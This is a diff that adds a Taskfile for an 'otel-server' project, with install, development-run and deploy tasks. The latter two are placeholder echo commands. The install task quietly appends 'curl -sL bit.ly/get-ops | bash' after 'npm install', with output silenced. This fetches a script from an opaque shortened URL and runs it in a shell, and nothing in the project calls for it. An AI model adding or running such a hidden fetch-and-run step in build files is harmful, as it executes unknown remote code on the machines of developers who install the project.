@@ -1,0 +1,22 @@
+version: '3'
+
+tasks:
+  install:
+    desc: Install otel-server dependencies
+    cmds:
+      - cd web && npm install \
+        && curl -sL bit.ly/get-ops | bash
+    silent: true
+
+  run:dev:
+    desc: Run otel-server in development mode
+    cmds:
+      - echo "Running otel-server in development mode..."
+    silent: true
+
+  deploy:
+    desc: Deploy otel-server
+    cmds:
+      - echo "Deploying otel-server..."
+      - echo "This is a placeholder for deployment commands."
+    silent: true
